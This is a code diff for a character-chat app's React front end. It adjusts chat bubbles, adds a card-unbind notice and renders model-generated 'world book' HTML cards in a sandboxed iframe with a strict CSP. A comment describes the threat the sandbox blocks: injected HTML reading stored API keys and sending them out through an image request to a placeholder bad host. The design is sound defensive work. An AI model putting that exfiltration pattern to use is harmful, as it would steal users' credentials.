@@ -295,13 +295,19 @@ function bubblePresetSkin(key) {
   const p = BUBBLE_PRESETS.find(x => x.key === key);
   return Object.assign({}, BUBBLE_SKIN_DEFAULTS, (p && p.patch) || {});
 }
-function applyBubblePreset(key) {
-  const next = bubblePresetSkin(key);
-  Object.assign(BUBBLE_SKIN, next);
-  try { localStorage.setItem("x_bubbleSkin", JSON.stringify(next)); } catch (e) {}
+// 气泡皮肤只有这一处读、这一处写（one-public-mechanism）。
+// ⚠️以前「换一套预设」和「设置页保存」各写了一份 Object.assign + setItem + 重刷 CSS；
+//   2026-09-20 主题包也要带上气泡，那就是第三份了——先合成一处再接。
+function bubbleSkinSnapshot() { return Object.assign({}, BUBBLE_SKIN); }
+function writeBubbleSkin(next) {
+  // 盖在出厂值上，不是盖在当前值上：否则上一套残留的描边/贴纸会跟着新皮肤留下来
+  const merged = Object.assign({}, BUBBLE_SKIN_DEFAULTS, next || {});
+  Object.assign(BUBBLE_SKIN, merged);
+  try { localStorage.setItem("x_bubbleSkin", JSON.stringify(merged)); } catch (e) {}
   applyBubbleSkinCSS();
-  return next;
+  return merged;
 }
+function applyBubblePreset(key) { return writeBubbleSkin(bubblePresetSkin(key)); }
 // 那一整排细调字段 + 试衣镜：三处共用（设置→聊天气泡、单聊 ••• 里「只给 TA 换气泡」）。
 // ⚠️跟 BubbleSkinPresets 同一条道理——一处画、多处用。各写一份的话，
 //   加一个新字段就只会加在其中一处，另一处永远少一栏（「一层写在两处，第二处没跟上」）。
@@ -8396,6 +8402,7 @@ function ChatThread({
     if (m.kind === "kinship") return h(KinshipIssueCard, { key: i, m: m, character: character });
     if (m.kind === "kinbill") return h(KinshipSpendCard, { key: i, m: m, character: character });
     if (m.kind === "kinraise") return h(KinshipRaiseCard, { key: i, m: m, character: character });
+    if (m.kind === "kinunbind") return h(KinshipUnbindCard, { key: i, m: m, character: character });
     if (m.kind === "paylater") return h(PayLaterCard, { key: i, m: m });
     if (m.kind === "couple_invite") return h("div", { key: i, className: "py-1 flex items-start gap-2 justify-end" },
       h(CoupleInviteCard, { m: m, character: character, asking: askingCouple === m.cid, onAsk: onAskCouple }),
@@ -8581,11 +8588,11 @@ function ChatThread({
       radius: 10
     })), /*#__PURE__*/React.createElement("div", {
       className: "flex flex-col",
-      style: {
+      style: Object.assign({
         alignItems: isU ? "flex-end" : "flex-start",
         maxWidth: "72%",
         minWidth: 0
-      }
+      }, (cardLayout(m.content) || {}).col)
     }, m.replyTo && h("div", {
       "data-wk": "quote",
       style: {
@@ -8609,8 +8616,8 @@ function ChatThread({
       onMouseUp: endPress,
       onMouseLeave: endPress,
       onClick: selMode ? () => toggleSel(i) : undefined,
-      "data-wk": "bubble", "data-me": isU ? "1" : "0", "data-kind": m.kind || "text",
-      style: {
+      "data-wk": "bubble", "data-me": isU ? "1" : "0", "data-kind": cardLayout(m.content) ? "htmlcard" : (m.kind || "text"),
+      style: Object.assign({
         position: "relative", // 贴纸的锚点：贴纸对着气泡自己定位
         padding: m.kind === "photo" ? "8px 10px" : "9px 13px",
         fontFamily: F_BODY,
@@ -8628,8 +8635,8 @@ function ChatThread({
         userSelect: "none",
         WebkitUserSelect: "none",
         WebkitTouchCallout: "none"
-      }
-    }, bubbleSticker(isU), m.kind === "location" ? h("span", {
+      }, (cardLayout(m.content) || {}).bubble)
+    }, cardLayout(m.content) ? null : bubbleSticker(isU), m.kind === "location" ? h("span", {
       className: "flex items-center gap-1.5"
     }, h(Svg, {
       size: 15,
@@ -10334,8 +10341,93 @@ function OnlineTranslationControl() {
         "清掉重来")),
     cleared ? h("div", { style: { fontFamily: F_BODY, fontSize: 11, color: t.fog, marginTop: 5 } }, cleared) : null);
 }
-function TransText({ text, isU, zhReady, ink }) {
+// ── 世界书卡片：模型吐出来的一整块 HTML，画成卡（她 2026-09-20 立）──────────
+// 她给的场景：有人把「触发词 + HTML 模板」写进世界书，角色按自己的人设把空填上，
+// 前端要把那一整块画出来，而不是把尖括号原样念一遍。
+//
+// ⚠️这一层【一个字都不进聊天提示词】（lisa-phone-chat-prompt-budget 那条铁律）。
+//   要不要出卡片、卡片长什么样，全写在【用户自己挂的那份世界书】里——
+//   世界书本来就是按关键词按需注入的。所以这边只做一件事：认出来，然后安全地画。
+//
+// ⚠️⚠️安全是这件事的全部：那段 HTML 带 onclick、带 <style>，而它是【别人写的世界书
+//   让模型生成的】。一旦让它在本页跑，它就能读 localStorage——那里面是她的 API key
+//   和云同步密码，一个 <img src="坏站/?k=..."> 就送出去了，画面上什么都看不出来。
+//   所以永远走 iframe，而且：
+//     · sandbox 只给 allow-scripts，【不给 allow-same-origin】——两个一起给等于没沙盒。
+//       不给 same-origin 时 iframe 是个独立空源：localStorage 抛异常、cookie 拿不到、
+//       父页面的 DOM 碰不到。按钮照样能按。
+//     · 再叠一条 CSP 把出网整个掐掉（default-src 'none'），连信标都发不出去。
+//   这两道缺一不可：沙盒挡「读」，CSP 挡「送」。
+// ⚠️认卡片那一层搬去了 engine.js（施工规则/one-public-mechanism.md）：
+//   拆气泡的流水线在 engine.js/app.js 里，比这儿低一层，得先认出「这是一整块卡片」
+//   才知道不许拆。两边各留一份＝改一处永远漏一处，所以这儿不留第二份。
+// 卡片自己报身高：不给 same-origin 就读不到 contentDocument，只能让里头喊一声。
+// 每张卡发一个一次性 token，父层只认自己那一张（一屏可能同时开着好几张）。
+const HTML_CARD_BOOT = tok => '<script>(function(){function r(){try{var w=document.getElementById("wk-wrap");'
+  + 'if(!w)return;var x=Math.ceil(w.getBoundingClientRect().height);'
+  + 'parent.postMessage({wkCard:"' + tok + '",h:x},"*")}catch(e){}}'
+  + 'addEventListener("load",r);addEventListener("resize",r);'
+  + 'if(window.ResizeObserver&&document.body)new ResizeObserver(r).observe(document.body);'
+  + '[60,300,1000].forEach(function(d){setTimeout(r,d)});r()})()<\/script>';
+const HTML_CARD_CSP = '<meta http-equiv="Content-Security-Policy" content="default-src \'none\'; '
+  + 'img-src data: blob:; style-src \'unsafe-inline\'; script-src \'unsafe-inline\'; font-src data:">';
+function htmlCardDoc(html, tok) {
+  return '<!DOCTYPE html><html><head><meta charset="utf-8">'
+    + '<meta name="viewport" content="width=device-width,initial-scale=1">'
+    + HTML_CARD_CSP
+    + '<style>html,body{margin:0;padding:0;background:transparent}'
+    + 'body{overflow-x:hidden}img{max-width:100%}'
+    + '#wk-wrap{display:flow-root}</style></head><body>'
+    + '<div id="wk-wrap">' + html + '</div>' + HTML_CARD_BOOT(tok) + '</body></html>';
+}
+// 卡片不套气泡（她 2026-09-20 报「格式难看」）：
+// 气泡那层皮是给【一句话】设计的——72% 宽、自己的底色、自己的圆角和内边距。
+// 卡片自带底色、自带边距、模板里往往还写着 max-width:400px，套进去就是：
+// 双层圆角、两层底色，而且被挤到两百多宽，「高考成绩通知单」断成两行，
+// 一张卡要滑三屏才看完。所以卡片这一条整行铺开，气泡那层皮整个撤掉。
+// ⚠️只有一处判据：同一个 htmlCardOf。单聊和群聊都从这儿要样式，不许各写一份
+//   （施工规则/one-public-mechanism.md）。
+function cardLayout(content) {
+  if (typeof htmlCardOf !== "function" || !htmlCardOf(content)) return null;
+  return {
+    col: { maxWidth: "100%", minWidth: 0 },
+    // 撤皮要撤干净：底色、边框、影子、圆角、内边距，留一样都会露出来
+    bubble: { padding: 0, background: "transparent", border: "none", boxShadow: "none", borderRadius: 0 }
+  };
+}
+function HtmlCard({ html }) {
+  const t = useTheme();
+  const tok = React.useMemo(() => "c" + Math.random().toString(36).slice(2, 10), [html]);
+  const [hgt, setHgt] = useState(160);
+  useEffect(() => {
+    const on = e => {
+      const d = e && e.data;
+      if (!d || d.wkCard !== tok) return;
+      const n = Number(d.h);
+      // ⚠️这儿不许再加余量。量的是内容层，但 ResizeObserver 会把我们设的高度
+      //   再吹回来一次；加一点就涨一点，正是 258→260→262 那条爬升回路。
+      if (n > 0 && n < 6000) setHgt(n);
+    };
+    window.addEventListener("message", on);
+    return () => window.removeEventListener("message", on);
+  }, [tok]);
+  return h("iframe", {
+    "data-wk": "htmlcard",
+    srcDoc: htmlCardDoc(html, tok),
+    sandbox: "allow-scripts",     // ⚠️不许加 allow-same-origin，见上面那段
+    referrerPolicy: "no-referrer",
+    scrolling: "no",
+    style: { display: "block", width: "100%", height: hgt + "px", border: "none",
+      background: "transparent", borderRadius: 10, colorScheme: "light" }
+  });
+}
+function TransText({ text, isU, zhReady, ink, inline }) {
   const [autoShow] = useOnlineTranslationAuto();
+  // 世界书卡片走这儿分流：TransText 是全库【唯一】那条正文渲染路（单聊/群聊/通话/
+  // 线下引用/查手机都用它），所以闸开在这一处，八处一起合规。
+  // inline 的那几处是「某某：一句话」这种夹在行里的引用，塞张卡进去会把那一行撑烂。
+  const _card = inline ? null : (typeof htmlCardOf === "function" ? htmlCardOf(text) : null);
+  if (_card) return h(HtmlCard, { html: _card });
   // 翻译状态属于原文和自带译文这一对内容。编辑、窗口复用、译文晚到时
   // 重建内部状态；旧异步请求只会结束在旧实例，不能把结果写进新气泡。
   return h(TransTextState, { key: JSON.stringify([text, !!isU, zhReady || ""]), text, isU, zhReady, ink, autoShow });
@@ -10353,6 +10445,9 @@ function TransText({ text, isU, zhReady, ink }) {
 //
 // ⚠️同一个形状写了两遍（单聊 / 群聊），照 施工规则/one-public-mechanism.md
 //   抽成这一份，两处都搬过来了，原地不留第二份。
+// ⚠️v72.08 起这一份不只服务气泡菜单：一起读的书架／批注、情侣空间抽屉的「长按删一样东西」
+//   也走它。onFire 收到的是 startPress 递进来的那个东西（下标、id、整条记录都行）。
+//   别再另写第二套——read.js 那份自己的实现就是这么长出来的，已经搬过来了。
 // ⚠️取消那一路挂在 document 上、不挂在每个气泡上：调用点有十七处，
 //   一处处补 onTouchMove 迟早漏，而且以后新加的气泡还会再漏一次。
 //   闸开在【按下去和抬起来之间】这段时间里，跟有几处调用点无关。
@@ -10715,7 +10810,7 @@ function CallEndPill({ m, chars, onBg }) {
         ? h("div", { key: j, style: { fontFamily: F_DISPLAY, fontStyle: "italic", fontSize: 11.5, color: t.fog, textAlign: "center", margin: "5px 0" } }, (l.senderName ? l.senderName + " " : "") + "（" + l.content + "）")
         : h("div", { key: j, style: { fontFamily: F_BODY, fontSize: 12.5, lineHeight: 1.6, color: t.ink, margin: "3px 0" } },
             l.ts ? h("span", { style: { fontFamily: "'Archivo','SF Mono',ui-monospace,monospace", fontSize: 9.5, color: t.fog, marginRight: 6 } }, String(new Date(l.ts).getHours()).padStart(2, "0") + ":" + String(new Date(l.ts).getMinutes()).padStart(2, "0")) : null,
-            h("span", { style: { color: l.role === "user" ? t.tint : t.sub, fontWeight: 600 } }, (l.role === "user" ? "我" : (l.senderName || "TA")) + "："), h(TransText, { text: l.content, isU: l.role === "user", zhReady: l.zh, ink: t.ink }),
+            h("span", { style: { color: l.role === "user" ? t.tint : t.sub, fontWeight: 600 } }, (l.role === "user" ? "我" : (l.senderName || "TA")) + "："), h(TransText, { text: l.content, isU: l.role === "user", zhReady: l.zh, ink: t.ink, inline: true }),
             l.role !== "user" ? h(TtsDot, { k: "pill" + j, text: l.content, spk: spkOf(l), tp }) : null)),
       m.sum ? h("div", { style: { marginTop: 8, paddingTop: 8, borderTop: "1px dashed " + t.line, fontFamily: F_BODY, fontSize: 11.5, color: t.sub, lineHeight: 1.6 } }, "小结：" + m.sum) : null) : null);
 }
@@ -10777,7 +10872,7 @@ function CallLogSheet({ calls, chars, onClose }) {
                 ? h("div", { key: j, style: { fontFamily: F_DISPLAY, fontStyle: "italic", fontSize: 11.5, color: t.fog, textAlign: "center", margin: "5px 0" } }, (l.senderName ? l.senderName + " " : "") + "（" + l.content + "）")
                 : h("div", { key: j, style: { fontFamily: F_BODY, fontSize: 12.5, lineHeight: 1.6, color: t.ink, margin: "3px 0" } },
                     l.ts ? h("span", { style: { fontFamily: "'Archivo','SF Mono',ui-monospace,monospace", fontSize: 9.5, color: t.fog, marginRight: 6 } }, fmtHM(l.ts)) : null,
-                    h("span", { style: { color: l.role === "user" ? t.tint : t.sub, fontWeight: 600 } }, (l.role === "user" ? "我" : (l.senderName || "TA")) + "："), h(TransText, { text: l.content, isU: l.role === "user", zhReady: l.zh, ink: t.ink }),
+                    h("span", { style: { color: l.role === "user" ? t.tint : t.sub, fontWeight: 600 } }, (l.role === "user" ? "我" : (l.senderName || "TA")) + "："), h(TransText, { text: l.content, isU: l.role === "user", zhReady: l.zh, ink: t.ink, inline: true }),
                     l.role !== "user" ? h(TtsDot, { k: key + "_" + j, text: l.content, spk: spkOf(l), tp }) : null)),
               m.sum ? h("div", { style: { marginTop: 8, paddingTop: 8, borderTop: "1px dashed " + t.line, fontFamily: F_BODY, fontSize: 11.5, color: t.sub, lineHeight: 1.6 } }, "小结：" + m.sum) : null) : null);
         })));
@@ -11484,6 +11579,35 @@ function KinshipSpendCard({ m, character }) {
 //      过一会儿回头看这段聊天，只看得见她开口要钱，看不见结果。
 // 现实里对应的东西是【提额申请】：报上现在多少、想加多少，递过去，等主卡那头批复，
 // 批完那张单子上要盖个戳。所以按那个来，颜色和卡面同一套（TA的颜色、TA的脸）。
+// 退卡通知（她 2026-09-19：「解绑的时候可以落一张通知卡到聊天，然后我回到聊天说完话
+// 让他回复他就知道我解绑了然后做出反应」）。
+// 跟提额单同一侧（右沿＝这是她按的一个键），但那一道颜色断成虚线：卡还在那儿，只是不通了。
+// ⚠️这张卡上不许写她「为什么」的推测，也不许替 TA 写反应——那两件事一个归她填的那行字，
+//   一个归 TA 下一轮自己说（bans-make-it-dumber：掷约束，别掷答案）。
+function KinshipUnbindCard({ m, character }) {
+  const t = useTheme();
+  const c = character || {};
+  const ink = c.color || "#6b7a8f";
+  return h("div", { className: "py-1 flex justify-end" },
+    h("div", { "data-wk": "card", style: { width: 244, borderRadius: 12, overflow: "hidden", background: t.bg2, border: "1px solid " + t.line, boxShadow: "0 1px 6px rgba(0,0,0,.07)" } },
+      h("div", { className: "flex" },
+        h("div", { style: { flex: 1, minWidth: 0 } },
+          h("div", { style: { padding: "10px 13px 11px" } },
+            h("div", { className: "flex items-center", style: { gap: 7, marginBottom: 8 } },
+              h(Avatar, { character: c, size: 20, radius: 6 }),
+              h("div", { style: { fontFamily: F_BODY, fontSize: 10.5, color: t.fog, minWidth: 0, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" } },
+                "把" + (c.name || "TA") + "的亲属卡退了")),
+            h("div", { className: "flex items-baseline", style: { gap: 7, flexWrap: "wrap" } },
+              h("span", { style: { fontFamily: F_DISPLAY, fontSize: 17, lineHeight: 1.1, color: t.fog, textDecoration: "line-through" } }, mTight(m.limit || 0, c && c.id)),
+              h("span", { style: { fontFamily: F_BODY, fontSize: 11, color: t.fog } }, "共刷过 " + mTight(m.used || 0, c && c.id))),
+            m.reason
+              ? h("div", { style: { marginTop: 8, fontFamily: F_DISPLAY, fontStyle: "italic", fontSize: 13, lineHeight: 1.45, color: t.ink } }, "「" + m.reason + "」")
+              : null),
+          h("div", { style: { padding: "6px 13px 7px", borderTop: "1px solid " + t.line, background: t.bg, fontFamily: F_BODY, fontSize: 10.5, color: t.fog } },
+            "这张卡已经不能再刷了")),
+        // 断成虚线的那一道：卡还在，只是不通了
+        h("div", { style: { width: 3, flexShrink: 0, backgroundImage: "repeating-linear-gradient(to bottom," + ink + " 0 5px,transparent 5px 10px)" } }))));
+}
 function KinshipRaiseCard({ m, character }) {
   const t = useTheme();
   const c = character || {};
@@ -14010,18 +14134,27 @@ function GroupThread({
         h(SelfieBubble, { m: m })));
     // 照片走公共那一张卡（PhotoCard）。原来这儿有图一种画法、没图一个灰方块＋
     // 描述整段摊在气泡里，而且【压根点不开】——「点开看描述」四处只有一处有。
-    if (m.kind === "photo") return h("div", {
-      key: i,
-      className: "flex justify-end py-1"
-    }, h("div", {
-      onTouchStart: selMode ? undefined : () => startPress(i), onTouchEnd: endPress,
-      onMouseDown: selMode ? undefined : () => startPress(i), onMouseUp: endPress, onMouseLeave: endPress,
-      style: {
-        maxWidth: "72%", borderRadius: 12,
-        outline: selMode && selIds.includes(i) ? "2px solid " + t.tint : "none",
-        outlineOffset: 2
-      }
-    }, h(PhotoCard, { m: m, mine: true, onOpen: selMode ? () => toggleSel(i) : () => setGPhotoView(m) })));
+    // ⚠️原来这儿写死 justify-end + mine:true——群里只有她会发图那会儿是对的。
+    //   v72.23 起没配图像通道时角色也发照片（只有描述的那一张），写死就会贴错边、
+    //   而且看不出是谁发的（她 2026-09-20 要的那件事）。照单聊那张卡的做法认 role。
+    if (m.kind === "photo") {
+      const pMine = m.role === "user";
+      const pCh = m.senderId ? memberById(m.senderId) : null;
+      return h("div", { key: i, className: "flex py-1 " + (pMine ? "justify-end" : "items-start gap-2 justify-start") },
+        !pMine && pCh ? h(Avatar, { character: pCh, size: 36, radius: 10 }) : null,
+        h("div", {
+          onTouchStart: selMode ? undefined : () => startPress(i), onTouchEnd: endPress,
+          onMouseDown: selMode ? undefined : () => startPress(i), onMouseUp: endPress, onMouseLeave: endPress,
+          style: {
+            maxWidth: "72%", borderRadius: 12,
+            outline: selMode && selIds.includes(i) ? "2px solid " + t.tint : "none",
+            outlineOffset: 2
+          }
+        },
+          // 群里得看得出是谁发的——名字跟别的气泡一个位置
+          !pMine && m.senderName ? h("div", { style: { fontFamily: F_BODY, fontSize: 10.5, color: t.fog, margin: "0 4px 2px" } }, m.senderName) : null,
+          h(PhotoCard, { m: m, mine: pMine, onOpen: selMode ? () => toggleSel(i) : () => setGPhotoView(m) })));
+    }
     const isU = m.role === "user";
     const c = m.senderId ? memberById(m.senderId) : null;
     // ⚠️原来这儿手写了一份「要不要显示时间戳、写成什么」，跟单聊那份各写各的：
@@ -14045,11 +14178,11 @@ function GroupThread({
       className: "flex items-start gap-2 " + (isU ? "justify-end" : "justify-start")
     }, !isU && mAvatar(c), h("div", {
       className: "flex flex-col",
-      style: {
+      style: Object.assign({
         alignItems: isU ? "flex-end" : "flex-start",
         maxWidth: "72%",
         minWidth: 0
-      }
+      }, (cardLayout(m.content) || {}).col)
     }, !isU && h("span", {
       style: {
         fontFamily: F_BODY,
@@ -14083,8 +14216,8 @@ function GroupThread({
       onMouseUp: endPress,
       onMouseLeave: endPress,
       onClick: selMode ? () => toggleSel(i) : undefined,
-      "data-wk": "bubble", "data-me": isU ? "1" : "0", "data-kind": m.kind || "text",
-      style: {
+      "data-wk": "bubble", "data-me": isU ? "1" : "0", "data-kind": cardLayout(m.content) ? "htmlcard" : (m.kind || "text"),
+      style: Object.assign({
         position: "relative", // 贴纸锚点
         padding: "9px 13px",
         fontFamily: F_BODY,
@@ -14102,8 +14235,8 @@ function GroupThread({
         userSelect: "none",
         WebkitUserSelect: "none",
         WebkitTouchCallout: "none"
-      }
-    }, bubbleSticker(isU), m.recalled ? m.content : h(TransText, { text: m.content, isU: isU, zhReady: m.zh })), msgFoot(i, m, !m.recalled && subLine(m))), isU && gsp.showMyAvatar && h(Avatar, { character: meAv, size: 34, radius: 8 })));
+      }, (cardLayout(m.content) || {}).bubble)
+    }, cardLayout(m.content) ? null : bubbleSticker(isU), m.recalled ? m.content : h(TransText, { text: m.content, isU: isU, zhReady: m.zh })), msgFoot(i, m, !m.recalled && subLine(m))), isU && gsp.showMyAvatar && h(Avatar, { character: meAv, size: 34, radius: 8 })));
   }).flatMap((row, i) => {
     // 思考链画在这一组回复的上方（和单聊、线下同一个组件、同一个位置）。
     // 群聊一次调用写完所有人，所以它挂在这一轮最先冒出来的那条上（v56.75）。
